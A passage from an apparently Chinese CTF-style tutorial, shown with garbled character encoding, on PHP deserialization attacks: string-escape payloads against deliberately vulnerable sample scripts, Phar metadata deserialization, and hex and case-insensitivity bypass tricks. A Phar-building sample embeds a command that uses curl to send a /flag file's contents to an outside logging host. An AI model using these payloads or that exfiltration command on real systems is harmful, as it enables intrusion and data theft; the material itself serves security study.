class="line">SplObjectStorage::unserialize</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„ï¼Œè¿™ç§æ–¹æ³•åœ¨åºåˆ—åŒ–æ—¶å¯¹phpç‰ˆæœ¬æœ‰è¦æ±‚ï¼Œç”¨7.3.4æ‰å¯ä»¥è¾“å‡ºä»¥Cå¼€å¤´çš„payloadï¼Œæ¢7.4æˆ–è€…8.0è¾“å‡ºçš„å°±æ˜¯Oå¼€å¤´äº†ï¼Œä½†åœ¨<code>unserialize</code>æ—¶å¯¹phpç‰ˆæœ¬æ²¡è¦æ±‚ã€‚</p><h1 id="å­—ç¬¦ä¸²é€ƒé€¸"><a href="#å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="å­—ç¬¦ä¸²é€ƒé€¸"></a>å­—ç¬¦ä¸²é€ƒé€¸</h1><p>å½“ PHP ä¸­åºåˆ—åŒ–åçš„æ•°æ®è¿›è¡Œäº†é•¿åº¦æ›¿æ¢ä¹‹åï¼Œå°±å¯èƒ½å­˜åœ¨è¿™ä¸€æ¼æ´ï¼Œå³é€šè¿‡ä¿®æ”¹è¾“å…¥æ•°æ®ä»è€Œæ§åˆ¶æ•´ä¸ªåºåˆ—åŒ–çš„å†…å®¹ã€‚</p><p>ååºåˆ—åŒ–çŸ¥è¯†ï¼š</p><ul><li>PHP åœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ <code>;</code> ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ <code>&#125;</code> ä½œä¸ºç»“å°¾ï¼ˆå­—ç¬¦ä¸²é™¤å¤–ï¼‰å¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„<ul><li>æ³¨æ„ç‚¹ï¼Œå¾ˆå®¹æ˜“ä»¥ä¸ºåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²æ˜¯<code>;&#125;</code>ç»“å°¾ï¼Œå®é™…ä¸Šå­—ç¬¦ä¸²åºåˆ—åŒ–æ˜¯ä»¥<code>;&#125;</code>ç»“å°¾çš„ï¼Œä½†å¯¹è±¡åºåˆ—åŒ–æ˜¯ç›´æ¥<code>&#125;</code>ç»“å°¾</li><li>phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œå°±æ˜¯é€šè¿‡è¿™ä¸ªç»“å°¾ç¬¦å®ç°çš„</li></ul></li><li>å½“é•¿åº¦ä¸å¯¹åº”çš„æ—¶å€™ä¼šå‡ºç°æŠ¥é”™</li><li>ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯æœ‰ä¸€å®šè¯†åˆ«èŒƒå›´çš„ï¼Œåœ¨è¿™ä¸ªèŒƒå›´ä¹‹å¤–çš„å­—ç¬¦éƒ½ä¼šè¢«å¿½ç•¥ï¼Œä¸å½±å“ååºåˆ—åŒ–çš„æ­£å¸¸è¿›è¡Œ</li></ul><h2 id="å­—ç¬¦å˜å¤š"><a href="#å­—ç¬¦å˜å¤š" class="headerlink" title="å­—ç¬¦å˜å¤š"></a>å­—ç¬¦å˜å¤š</h2><p>æ ·ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test2</span>=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test1</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;test1 = <span class="variable">$test1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;test2===<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;you get it!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;test1&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$test1</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;yy&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é—®ï¼šå¦‚æœæˆ‘èƒ½æ§åˆ¶è¿›è¡Œååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œè¯¥å¦‚ä½•ä½¿<code>$test2</code>çš„å€¼æ˜¯<code>admin</code>è€Œä¸æ˜¯<code>hacker</code>ï¼Ÿ</p><p>å‡å¦‚ä¼ å…¥çš„<code>test1</code>æ˜¯<code>xxx123</code>ï¼š</p><ul><li>æ­£å¸¸æƒ…å†µä¸‹åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸º<code>O:1:&quot;A&quot;:2:&#123;s:5:&quot;test1&quot;;s:6:&quot;xxx123&quot;;s:5:&quot;test2&quot;;s:6:&quot;hacker&quot;;&#125;</code></li><li>ç»è¿‡æ›¿æ¢åï¼Œå˜æˆ<code>O:1:&quot;A&quot;:2:&#123;s:5:&quot;test1&quot;;s:6:&quot;yyyyyy123&quot;;s:5:&quot;test2&quot;;s:6:&quot;hacker&quot;;&#125;</code></li><li>ååºåˆ—åŒ–æ—¶ï¼Œè¯»å–<code>yyyyyy</code>åï¼Œå‘ç°æ²¡æœ‰é—­åˆç¬¦å·ï¼Œå› æ­¤ååºåˆ—åŒ–å¤±è´¥</li><li>æ­¤æ—¶å‘ç°<code>123</code>é€ƒé€¸å‡ºæ¥äº†ï¼Œè¿™éƒ¨åˆ†æ˜¯å¯æ§çš„ã€‚</li></ul><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™å¯æ§çš„éƒ¨åˆ†æŠŠ<code>test2</code>çš„å€¼æ”¹æ‰ã€‚</p><ul><li><p>è¿™æ—¶å€™ï¼Œéœ€è¦å…ˆæ‰¾åˆ°ä¸€ä¸ªè¦é€ƒé€¸é‚£éƒ¨åˆ†çš„å­—ç¬¦ä¸²ã€‚</p></li><li><p><code>&quot;;s:5:&quot;test2&quot;;s:5:&quot;admin&quot;;&#125;</code>æ˜¯æˆ‘ä»¬éœ€è¦é€ƒé€¸çš„éƒ¨åˆ†ã€‚æœ€ç®€å•çš„åˆ¤æ–­æ–¹æ³•æ˜¯å…ˆæœ¬åœ°åºåˆ—åŒ–å‡ºä¸€ä¸ªæˆ‘ä»¬æƒ³è¦çš„åºåˆ—åŒ–å­—ç¬¦ä¸²<code>O:1:&quot;A&quot;:2:&#123;s:5:&quot;test1&quot;;s:6:&quot;xxx123&quot;;s:5:&quot;test2&quot;;s:5:&quot;admin&quot;;&#125;</code>ï¼Œç„¶åä»¥<code>xxx123</code>ä¸ºåˆ†ç•Œçº¿ï¼Œå–åè¾¹æ‰€æœ‰çš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å°±æ˜¯æˆ‘ä»¬éœ€è¦é€ƒé€¸çš„éƒ¨åˆ†ã€‚</p></li><li><p>ä¹‹åç»Ÿè®¡å‡º<code>&quot;;s:5:&quot;test2&quot;;s:5:&quot;admin&quot;;&#125;</code>çš„é•¿åº¦ä¸º27ï¼Œè¯´æ˜æˆ‘ä»¬éœ€è¦é€ƒé€¸27ä¸ªå­—ç¬¦ã€‚</p></li><li><p>æ›¿æ¢å‡½æ•°æ˜¯å°†<code>x</code>æ›¿æ¢æˆ<code>yy</code>ï¼Œå¤šå‡º1ä¸ªå­—ç¬¦ï¼Œå› æ­¤è¾“å…¥27ä¸ª<code>x</code>ï¼Œå°±èƒ½é€ƒé€¸å‡º27ä¸ªå­—ç¬¦ã€‚</p></li><li><p>å› æ­¤<code>test1</code>çš„å€¼ä¸º<code>xxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;s:5:&quot;test2&quot;;s:5:&quot;admin&quot;;&#125;</code></p><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E9%80%83%E9%80%B8_1_1.png"></p></li></ul><h2 id="å­—ç¬¦å‡å°‘"><a href="#å­—ç¬¦å‡å°‘" class="headerlink" title="å­—ç¬¦å‡å°‘"></a>å­—ç¬¦å‡å°‘</h2><p>æ ·ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test2</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test3</span>=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test1</span>,<span class="variable">$test2</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;test1 = <span class="variable">$test1</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;test2 = <span class="variable">$test2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;test3===<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;you get it!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;test1&#x27;</span>];</span><br><span class="line"><span class="variable">$test2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;test2&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$test1</span>,<span class="variable">$test2</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;xx&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é—®ï¼šå¦‚æœæˆ‘èƒ½æ§åˆ¶è¿›è¡Œååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œè¯¥å¦‚ä½•ä½¿<code>$test3</code>çš„å€¼æ˜¯<code>admin</code>è€Œä¸æ˜¯<code>hacker</code>ï¼Ÿ</p><p>å‡å¦‚ä¼ å…¥çš„<code>test1</code>æ˜¯<code>xxxxxx</code>ï¼Œ<code>test2</code>æ˜¯<code>abc</code>ï¼š</p><ul><li>æ­£å¸¸æƒ…å†µä¸‹åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸º<code>O:1:&quot;A&quot;:3:&#123;s:5:&quot;test1&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;test2&quot;;s:3:&quot;abc&quot;;s:5:&quot;test3&quot;;s:6:&quot;hacker&quot;;&#125;</code></li><li>ç»è¿‡æ›¿æ¢åï¼Œå˜æˆ<code>O:1:&quot;A&quot;:3:&#123;s:5:&quot;test1&quot;;s:6:&quot;xxx&quot;;s:5:&quot;test2&quot;;s:3:&quot;abc&quot;;s:5:&quot;test3&quot;;s:6:&quot;hacker&quot;;&#125;</code></li><li>ååºåˆ—åŒ–æ—¶ï¼Œè¯»å–<code>xxx&quot;;s</code>(é•¿åº¦ä¸º6)åï¼Œå‘ç°æ²¡æœ‰é—­åˆç¬¦å·ï¼Œå› æ­¤ååºåˆ—åŒ–å¤±è´¥ã€‚</li><li>æ­¤æ—¶å‘ç°<code>&quot;;s</code>è¢«å¸æ”¶è¿›<code>test1</code>é‡Œäº†ï¼Œè¿™éƒ¨åˆ†æ˜¯å¯æ§çš„ï¼Œå¯ä»¥æ§åˆ¶å¸æ”¶å¤šå°‘ä¸ªå­—ç¬¦ã€‚</li></ul><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™å¯æ§çš„éƒ¨åˆ†æŠŠä¸€äº›ä¸éœ€è¦çš„å€¼å¸æ”¶è¿›å»ï¼Œå†é€šè¿‡æ§åˆ¶ç¬¬äºŒä¸ªå˜é‡ï¼Œæ„é€ å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ã€‚</p><ul><li><p>éœ€è¦å…ˆæ‰¾åˆ°ä¸€ä¸ªè¦é€ƒé€¸é‚£éƒ¨åˆ†çš„å­—ç¬¦ä¸²</p></li><li><p>æ–¹æ³•å’Œ<code>å­—ç¬¦å˜å¤š</code>ä¸€æ ·ï¼Œå…ˆæœ¬åœ°åºåˆ—åŒ–å‡ºä¸€ä¸ªæˆ‘ä»¬æƒ³è¦çš„åºåˆ—åŒ–å­—ç¬¦ä¸²<code>O:1:&quot;A&quot;:2:&#123;s:5:&quot;test1&quot;;s:6:&quot;xxx123&quot;;s:5:&quot;test2&quot;;s:3:&quot;abc&quot;;s:5:&quot;test3&quot;;s:5:&quot;admin&quot;;&#125;</code>ï¼Œç„¶åä»¥<code>xxx123</code>ä¸ºåˆ†ç•Œçº¿ï¼Œå–åè¾¹æ‰€æœ‰çš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å°±æ˜¯æˆ‘ä»¬éœ€è¦é€ƒé€¸çš„éƒ¨åˆ†ã€‚</p></li><li><p><code>&quot;;s:5:&quot;test2&quot;;s:3:&quot;abc&quot;;s:5:&quot;test3&quot;;s:5:&quot;admin&quot;;&#125;</code>æ˜¯éœ€è¦é€ƒé€¸çš„éƒ¨åˆ†ã€‚</p></li><li><p>æ¥ä¸‹æ¥æ‰¾éœ€è¦å¸æ”¶çš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬éœ€è¦æŠŠ<code>&quot;;s:5:&quot;test2&quot;;s:3:&quot;</code>å¸æ”¶è¿›æ¥ï¼Œè¿™é‡Œçš„<code>:3:</code>ä¸æ˜¯å›ºå®šçš„ï¼Œ<code>3</code>æ˜¯ä¸Šé¢é€ƒé€¸éƒ¨åˆ†çš„é•¿åº¦ï¼ˆ49ï¼‰ã€‚ï¼ˆè¿™ä¸ªä¸æ˜¯é‡ç‚¹ï¼‰</p></li><li><p>æ­¤æ—¶æˆ‘ä»¬éœ€è¦æŠŠ<code>&quot;;s:5:&quot;test2&quot;;s:49:&quot;</code>å¸æ”¶è¿›æ¥ï¼Œè®©åŸæœ¬<code>test2</code>çš„å€¼æˆä¸ºååºåˆ—åŒ–å­—ç¬¦ä¸²çš„åˆæ³•éƒ¨åˆ†ã€‚</p></li><li><p>ç»Ÿè®¡å‡º<code>&quot;;s:5:&quot;test2&quot;;s:49:&quot;</code>çš„é•¿åº¦ä¸º20ï¼Œè¯´æ˜æˆ‘ä»¬éœ€è¦å¸æ”¶20ä¸ªå­—ç¬¦ã€‚</p></li><li><p>æ›¿æ¢å‡½æ•°æ˜¯å°†<code>xx</code>æ›¿æ¢æˆ<code>y</code>ï¼Œå‡å°‘1ä¸ªå­—ç¬¦ï¼Œå› æ­¤è¾“å…¥40ä¸ª<code>x</code>ï¼Œå°±èƒ½å¸æ”¶20ä¸ªå­—ç¬¦ã€‚</p></li><li><p>å› æ­¤ä¼ å…¥<code>test1</code>çš„å€¼ä¸º<code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code>ï¼Œ<code>test2</code>çš„å€¼ä¸º<code>&quot;;s:5:&quot;test2&quot;;N;s:5:&quot;test3&quot;;s:5:&quot;admin&quot;;&#125;</code></p><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E9%80%83%E9%80%B8_2_1.png"></p></li></ul><h1 id="Pharååºåˆ—åŒ–"><a href="#Pharååºåˆ—åŒ–" class="headerlink" title="Pharååºåˆ—åŒ–"></a>Pharååºåˆ—åŒ–</h1><p>Pharæ–‡ä»¶æ˜¯phpé‡Œç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œåœ¨PHP 5.3 æˆ–æ›´é«˜ç‰ˆæœ¬ä¸­é»˜è®¤å¼€å¯ï¼Œä¸€ä¸ªpharæ–‡ä»¶ä¸€ä¸ªåˆ†ä¸ºå››éƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.a stub</span><br><span class="line">    å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸ºxxx&lt;?php xxx; __HALT_COMPILER();?&gt;ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥__HALT_COMPILER();æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶</span><br><span class="line">2.a manifest describing the contents</span><br><span class="line">pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹</span><br><span class="line">3.the file contents</span><br><span class="line">è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹</span><br><span class="line">4.[optional] a signature for verifying Phar integrity (phar file format only)</span><br><span class="line">ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>ç”Ÿæˆpharæ–‡ä»¶</strong></p><p>phpå†…ç½®äº†ä¸€ä¸ªPharç±»æ¥å¤„ç†ç›¸å…³æ“ä½œ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šè¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶</p><p>phpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼ŒåŸºæœ¬ä¸Šèƒ½ä½¿ç”¨ä¼ªåè®®çš„æ–‡ä»¶æ“ä½œå‡½æ•°éƒ½èƒ½è§¦å‘ååºåˆ—åŒ–ã€‚</p><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/phar_1_1.png"></p><p><strong>Pharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</strong></p><p>æ—¢ç„¶å¾ˆå¤šå‡½æ•°å¯ä»¥è§¦å‘pharååºåˆ—åŒ–ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±è¦å®é™…åˆ©ç”¨è¯¥æ¼æ´</p><p>Pharååºåˆ—åŒ–ä¸ä¼šè°ƒç”¨ <code>weakup </code>ç­‰æ–¹æ³•</p><p>å¯ä»¥åœ¨ä¸è°ƒç”¨<code>unserialize()</code>çš„æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚</p><p><strong>æ¼æ´åˆ©ç”¨æ¡ä»¶</strong></p><ol><li>pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚</li><li>è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚</li><li>æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”<code>:</code>ã€<code>/</code>ã€<code>phar</code>ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤</li></ol><p>pharæ–‡ä»¶ç”Ÿæˆæ ·ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;curl http://kbqsag.ceye.io/?p=`cat /flag`&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);    <span class="comment">//è®¾ç½®Stub</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);    <span class="comment">//è®¾ç½®Meta-data</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);    <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="å°æŠ€å·§-ç‰¹æ€§"><a href="#å°æŠ€å·§-ç‰¹æ€§" class="headerlink" title="å°æŠ€å·§&#x2F;ç‰¹æ€§"></a>å°æŠ€å·§&#x2F;ç‰¹æ€§</h1><h2 id="åå…­è¿›åˆ¶ç»•è¿‡å…³é”®å­—"><a href="#åå…­è¿›åˆ¶ç»•è¿‡å…³é”®å­—" class="headerlink" title="åå…­è¿›åˆ¶ç»•è¿‡å…³é”®å­—"></a>åå…­è¿›åˆ¶ç»•è¿‡å…³é”®å­—</h2><p>phpååºåˆ—åŒ–æ˜¯å¯ä»¥ä½¿ç”¨16è¿›åˆ¶çš„ï¼Œåªéœ€è¦æŠŠç±»å‹å°<code>s</code>æ”¹æˆå¤§<code>S</code>ã€‚</p><p>æ ·ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%89%B9%E6%80%A7_1_1.png"></p><p><code>t</code>çš„16è¿›åˆ¶æ˜¯<code>\74</code>ï¼ŒæŠŠ<code>s</code>æ”¹æˆ<code>S</code>æ—¶ï¼Œä¾¿èƒ½å°†<code>\74</code>è§£ææˆ<code>t</code>ã€‚</p><h2 id="ç±»åå¤§å°å†™ä¸æ•æ„Ÿ"><a href="#ç±»åå¤§å°å†™ä¸æ•æ„Ÿ" class="headerlink" title="ç±»åå¤§å°å†™ä¸æ•æ„Ÿ"></a>ç±»åå¤§å°å†™ä¸æ•æ„Ÿ</h2><p>phpå¯¹äºç±»åå¤§å°å†™ä¸æ•æ„Ÿï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>A</code>å’Œ<code>a</code>éƒ½ä¼šè®¤ä¸ºæ˜¯åŒä¸€ä¸ªç±»ã€‚</p><p>æ ·ä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__destruct1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/./php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%89%B9%E6%80%A7_2_1.png"></p><h2 id="ç±»å†…æ–¹æ³•è°ƒç”¨"><a href="#ç±»å†…æ–¹æ³•è°ƒç”¨" class="headerlink" title="ç±»å†…æ–¹æ³•è°ƒç”¨"></a>ç±»å†…æ–¹æ³•è°ƒç”¨</h2><p>æ ·ä¾‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td 